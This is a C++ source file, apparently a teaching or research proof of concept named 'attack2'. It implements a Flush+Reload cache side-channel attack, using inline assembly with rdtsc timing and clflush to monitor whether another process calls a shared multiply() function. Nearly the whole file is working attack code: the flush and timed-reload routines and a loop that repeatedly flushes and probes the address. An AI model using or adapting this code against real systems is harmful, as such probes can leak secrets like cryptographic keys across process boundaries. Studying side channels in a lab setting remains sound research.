//
// Created by sorliog on 4/8/2023.
//
#include "shared.h"
#include<ctime>
#include<unistd.h>
#include <iostream>
#include <cstring>


#define DEFAULT_THRESHOLD 1000
/**
 * Check if an adress location was accessed before
 * @param adrs The address to check
 * @param threshold Time limit to access this location. If longer than threshold, then it was not accessed
 * @return One or zero, if the location was accessed of not
 */
unsigned int check(const void *adrs, const unsigned long threshold) {
    volatile unsigned long time;
    asm __volatile__ (
            "mfence                  \n"
            "lfence                  \n"
            "rdtsc                   \n"
            "movl %%eax, %%esi       \n"
            "movl (%1), %%eax        \n"
            "lfence                  \n"
            "rdtsc                   \n"
            "subl %%esi, %%eax       \n"
            "clflush 0(%1)           \n"
            : "=a" (time)
            : "c" (adrs)
            : "%esi", "%edx"
            );
    return time < threshold;
}

/**
 * Clear the given address from the cache
 * @param adrs Address to clear
 */
void flush(const void *adrs) {
    asm __volatile__ (
            "mfence             \n"
    	    "lfence             \n"
            "clflush 0(%0)      \n"::"c" (adrs)
            );
}


void help(){
	printf("USAGE: ./attack2 threshold1\n\n");
	printf("---OPTIONS---\n");	
	printf("threshold1: The threshold value for multiply(), default 1000\n");	
	printf("--help: Show this help message\n");	
}



int main(int argc, char *args[]) {
    for(int i = 0; i < argc; i++){
    	if(strcmp(args[i], "-?") == 0 || strcmp(args[i], "-h") == 0 || strcmp(args[i], "--help") == 0){
    	help();
    	return 0;
    	} 
    }


    int threshold = DEFAULT_THRESHOLD;
    if(argc == 2){
        threshold = atoi(args[1]);
    }
    
    printf("Using %d as threshold\n", threshold);
    
    /**
     * Address that we will be monitoring. Set to the multiply() function from shared.h
     */
    void *addrs = (void *) multiply;
    std::time_t time;
    while (1) {
        // Clear the cache
        flush(addrs);
        time = std::time(0);

        // Wait some time
        //usleep(333333);

        while (std::time(0) <= time){
            usleep(10);
        }

        // Check if addrs was accessed
        int accessed = check(addrs, threshold);
        time = std::time(0);
        printf("[%ld] Accessed addr multiply:%d\n", time, accessed);
    }
}
